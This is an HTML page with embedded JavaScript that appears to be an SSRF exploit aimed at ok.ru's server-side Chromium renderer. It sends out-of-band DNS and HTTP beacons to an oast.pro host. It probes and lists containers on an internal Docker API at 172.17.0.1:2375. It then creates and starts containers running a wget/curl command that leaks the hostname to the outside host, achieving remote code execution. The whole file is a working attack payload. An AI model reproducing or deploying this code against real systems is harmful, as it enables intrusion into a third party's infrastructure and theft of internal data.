<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>OK</title></head>
<body>
<script>
'use strict';
// ok.ru Chromium SSRF — probe v9 (fire-and-forget: no await, iframe navs survive render timeout)
// KEY INSIGHT: form.submit() to iframe is a browser-level navigation — survives JS timeout
// Strategy: fire ALL requests in <100ms synchronously, no awaiting anything
// setTimeout handles create→start sequencing without blocking main thread

const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
const T0 = Date.now();

const clean = (s) => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);

// Use only new Image().src — no fetch() wrapper needed (fetch itself adds latency)
const dnsOob = (label) => { new Image().src = `https://${clean(label)}.${OOB}/`; };

// Fire-and-forget form POST — no await, iframe navigation is independent of JS timeout
const ffPost = (lp, url, jsonBody) => {
  try {
    const ifr = document.createElement('iframe');
    ifr.name = `ifr${lp}`;
    ifr.style.display = 'none';
    document.body.appendChild(ifr);
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'text/plain';
    form.target = `ifr${lp}`;
    if (jsonBody !== null) {
      const obj = { ...jsonBody, _x: '' };
      const full = JSON.stringify(obj);
      const split = full.lastIndexOf('"_x":"');
      const inp = document.createElement('input');
      inp.name = full.substring(0, split + 7);
      inp.value = '"}';
      form.appendChild(inp);
    }
    document.body.appendChild(form);
    dnsOob(`${lp}s`);
    form.submit();
  } catch(e) { dnsOob(`${lp}x`); }
};

const rceCmd = `wget -q -T5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sk -m5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"; nslookup "rce-ok.${OOB}" 2>/dev/null`;

// ── Main: everything fires synchronously in <50ms ──────────────────────────
dnsOob(`v9s-${clean(navigator.userAgent.substring(0,25))}`);

const IP = '172.17.0.1';
const PORT = 2375;
const BASE = `http://${IP}:${PORT}/v1.41`;

// Also probe with fetch (fire and forget, non-blocking)
fetch(`${BASE}/_ping`, { signal: AbortSignal.timeout(2000) })
  .then(r => { dnsOob(`dp-ok-${r.status}`); return r.text(); })
  .then(b => dnsOob(`dp-body-${clean(b.substring(0,8))}`))
  .catch(e => dnsOob(`dp-err-${clean((e.name||'u').substring(0,6))}`));

fetch(`${BASE}/containers/json?all=1`, { signal: AbortSignal.timeout(2000) })
  .then(r => r.text())
  .then(b => {
    dnsOob('cj-ok');
    try {
      const ctrs = JSON.parse(b);
      dnsOob(`cj-cnt-${ctrs.length}`);
      (ctrs.slice(0,2)).forEach(c => dnsOob(`cj-img-${clean((c.Image||'na').substring(0,15))}`));
    } catch(e) {}
  })
  .catch(() => dnsOob('cj-err'));

// RCE: fire all creates immediately, starts via setTimeout (sequencing w/o blocking)
const images = ['busybox', 'alpine', 'ubuntu', 'debian'];
images.forEach((img, i) => {
  const name = `r9${img.substring(0,3)}`;
  const body = { Image: img, Cmd: ['sh','-c', rceCmd], HostConfig: { NetworkMode:'host', AutoRemove:true } };
  dnsOob(`cr-${img.substring(0,4)}`);
  ffPost(`c${i}`, `${BASE}/containers/create?name=${name}`, body);
  // Start 800ms after create — enough time for Docker to process create before start
  setTimeout(() => {
    dnsOob(`st-${img.substring(0,4)}`);
    ffPost(`s${i}`, `${BASE}/containers/${name}/start`, null);
  }, 800 + i * 300);
});

dnsOob('v9-all-fired');
</script>
</body>
</html>
